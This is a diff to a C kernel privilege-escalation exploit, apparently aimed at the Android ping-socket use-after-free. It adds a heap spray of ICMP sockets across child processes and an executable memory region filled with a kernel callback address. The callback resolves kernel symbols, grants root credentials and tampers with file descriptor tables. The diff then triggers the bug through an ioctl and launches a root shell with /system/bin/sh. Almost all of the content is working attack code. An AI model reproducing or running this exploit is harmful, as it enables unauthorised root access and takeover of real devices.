@@ -16,10 +16,95 @@
 
 #define SIOCGSTAMPNS 0x8907
 
-#define FILL_DATA 0x0db4da5f
+#define FILL_DATA 0x50000000
 #define NSEC_PER_SEC 1000000000
 
 #define _PAGE_SIZE 0x1000
+
+extern int root_by_set_cred(void);
+extern int root_by_commit_cred();
+
+int (*my_printk)(const char *fmt, ...) = 0;
+struct task_struct *(*my_find_task_by_pid_ns)(pid_t nr, struct pid_namespace *ns);
+struct files_struct *(*my_get_files_struct)(struct task_struct *task);
+
+extern unsigned long lookup_sym(const char *name);
+pid_t my_pid;
+struct file;
+struct fdtable {
+	unsigned int max_fds;
+	struct file **fd;      /* current fd array */
+	unsigned long *close_on_exec;
+	unsigned long *open_fds;
+	unsigned long *place_holder[2];
+	struct fdtable *next;
+};
+
+struct files_struct {
+  /*
+   * read mostly part
+   */
+	int count;
+	struct fdtable *fdt;
+	struct fdtable fdtab;
+
+};
+struct pid_namespace;
+
+static int call_back()
+{
+        int tmp;
+        struct files_struct *fs;
+        struct pid_namespace *ns;
+        int i;
+        struct ping_table *pt;
+	int first = 0;
+
+	my_pid = getpid();
+        my_printk = lookup_sym("printk");
+        my_find_task_by_pid_ns = lookup_sym("find_task_by_pid_ns");
+        my_get_files_struct = lookup_sym("get_files_struct");
+        ns = lookup_sym("init_pid_ns");
+        my_printk("GOT in kernel!\n");
+
+        pt = lookup_sym("ping_table");
+
+        root_by_set_cred();
+
+        fs = my_get_files_struct(my_find_task_by_pid_ns(my_pid, ns));
+        struct fdtable *fdt  =  fs->fdt;
+
+        while (fdt) {
+		if (!first) {
+			fdt->max_fds = 3;
+			first = 1;
+		}
+		else
+			fdt->max_fds = 0;
+		
+                fdt = fdt->next;
+        }
+
+
+        /* for(i = 0; i < 64; i++) { */
+        /*         pt->hash[i].first = (i << 1) + 1; */
+        /* } */
+        
+        /*
+        for(i = PING_PAD; i < PING_MAX; i++) {
+                if (fds_close[i - PING_PAD] == 0) {
+                        //printf("close sockfd %d\n", i);
+                        close(fds[i]);
+                }
+        }
+        */
+
+        /* struct thread_info_part *thread_info = (unsigned long)&tmp & ~0x1fff; */
+        /* thread_info->addr_limit = 0; */
+
+        return 0;
+}
+
 
 static int maximize_fd_limit(void)
 {
@@ -71,21 +156,21 @@ static int create_icmp_socket(void)
 }
 
 
-static int wait_for_child(int pipe_read)
+static int wait_for_child(int pipe_read, int *child_socks)
 {
 	int i;
-	char msg[16];
 	int ret;
 
 
-	ret = fcntl(pipe_read, F_SETFL, O_NONBLOCK);
-	if (ret == -1) {
-		perror("fcntl()");
-		return -1;
-	}
+	/* ret = fcntl(pipe_read, F_SETFL, O_NONBLOCK); */
+	/* if (ret == -1) { */
+	/* 	perror("fcntl()"); */
+	/* 	return -1; */
+	/* } */
 
 	for (i = 0; i < 50; i++) {
-		ret = read(pipe_read, msg, 3);
+		ret = read(pipe_read, child_socks, sizeof(int));
+		//printf("parent read: %d \n", ret);
 		if (ret == -1 && errno == EAGAIN) {
 			usleep(100000);
 			continue;
@@ -104,8 +189,9 @@ static int wait_for_child(int pipe_read)
 		return -1;
 	}
 
-	if (ret != 3) {
+	if (ret != sizeof(int)) {
 		printf("read(): Unexpected EOF\n");
+		perror("wait child");
 		return -1;
 	}
 
@@ -113,9 +199,18 @@ static int wait_for_child(int pipe_read)
 	return 0;
 }
 
+static void close_fds_except_pipe(int pipe_fd, int max_fd)
+{
+	int i;
+	for(i = 0; i < max_fd; i++) {
+		if (i == pipe_fd)
+			continue;
+		close(i);
+	}
+}
 
 
-static int create_child(int *pipe_read, int max_fd)
+static int create_child(int *pipe_read, int max_fd, int *child_socks)
 {
 	pid_t pid;
 	int socks[max_fd];
@@ -133,7 +228,8 @@ static int create_child(int *pipe_read, int max_fd)
 	if (pid < 0)
 		return -1;
 	if (pid == 0) {
-		close(fds[0]);
+		//close(fds[0]);
+		close_fds_except_pipe(fds[1], max_fd);
 
 		for (i = 0; i < max_fd; i++) {
 			socks[i] = create_icmp_socket();
@@ -143,7 +239,8 @@ static int create_child(int *pipe_read, int max_fd)
 			}
 		}
 
-		write(fds[1], "OK", 3);
+		printf("child create %d sockets!\n", i);
+		write(fds[1], &i, sizeof(int));
 
 		while (1) {
 			sleep(6);
@@ -151,9 +248,11 @@ static int create_child(int *pipe_read, int max_fd)
 		exit(0);
 
 	}
+
+	/* parent process */
 	close(fds[1]);
 	*pipe_read = fds[0];
-	ret = wait_for_child(fds[0]);
+	ret = wait_for_child(fds[0], child_socks);
 	if (ret != 0)
 		return -1;
 	return pid;
@@ -248,13 +347,21 @@ static int get_sk(int sock)
 		return -1;
 	}
 
-	value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
-	high = (unsigned)(value >> 32);
-	low = (unsigned)value;
-
-	if (high == FILL_DATA){
+	if (tv.tv_sec == 0x5798ee24
+	    || tv.tv_sec == 0x50000000) {
+		//printf("sock object refill done!\n");
+		//ioctl(fds[i], 0x5678, &temp);
 		return 1;
+
 	}
+
+	/* value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec; */
+	/* high = (unsigned)(value >> 32); */
+	/* low = (unsigned)value; */
+
+	/* if (high == FILL_DATA){ */
+	/* 	return 1; */
+	/* } */
 
 	return 0;
 
@@ -275,6 +382,9 @@ int main()
 	int success, count;
 	int fd;
 	int vulnerable = 0;
+	int child_socks, total_child_socks;
+	int temp;
+	unsigned long *target;
 
 
 	addr = mmap((void*)0x200000, _PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
@@ -304,6 +414,18 @@ int main()
 		return -1;
 	}
 
+	if (mmap(0x50000000, 0x4000, PROT_WRITE | PROT_READ | PROT_EXEC,
+                 MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0) != 0x50000000) {
+                printf("map shellcode area failed!\n");
+                return -1;
+        }
+
+        for (i = 0; i < 0x4000; i += 4){
+                target = 0x50000000 + i;
+                *target = call_back;
+        }
+
+
 	max_fds = maximize_fd_limit();
 	printf("max_fds = %d\n", max_fds);
 	socks = malloc(sizeof(int*) * (max_fds + 1));
@@ -311,8 +433,12 @@ int main()
 	printf("create child to spray\n");
 	num_child = 0;
 	num_socks = 0;
+	child_socks = 0;
+	total_child_socks = 0;
 	for (i = 0; i < MAX_CHILD; i++) {
-		pid[i] = create_child(&pipe_read[i], max_fds);
+
+		
+		pid[i] = create_child(&pipe_read[i], max_fds, &child_socks);
 
 		if (pid[i] == -1)
 			break;
@@ -320,12 +446,14 @@ int main()
 		printf(".");
 		fflush(stdout);
 		//printf("create vulnerable socket!\n");
-		for (j = num_socks; j < max_fds; j++){
-			socks[j] = create_icmp_socket();
-			if (socks[j] == -1)
+		total_child_socks += child_socks;
+		//printf("\n now child sockets = %d\n", total_child_socks);
+		if ( num_socks < max_fds) {
+			socks[num_socks] = create_icmp_socket();
+			if (socks[num_socks] == -1)
 				break;
+			num_socks++;
 		}
-		num_socks += j;
 	}
 	num_child = i;
 	printf("\nchild num: %d\n", num_child);
@@ -364,6 +492,7 @@ int main()
 				if (get_sk(socks[j]) > 0) {
 					success = 1;
 					printf("get it!\n");
+					ioctl(socks[j], 0x5678, &temp);
 					break;
 				}
 			}
@@ -377,11 +506,13 @@ int main()
 			for (i = 0; i < count; i++) {
 				munmap(address[i], MAP_SIZE);
 			}
+			munmap(0x50000000, 0x4000);
+			system("/system/bin/sh");
 
 			break;
 		}
 	}
-
+	
 	printf("main end!\n");
 
 	return 0;
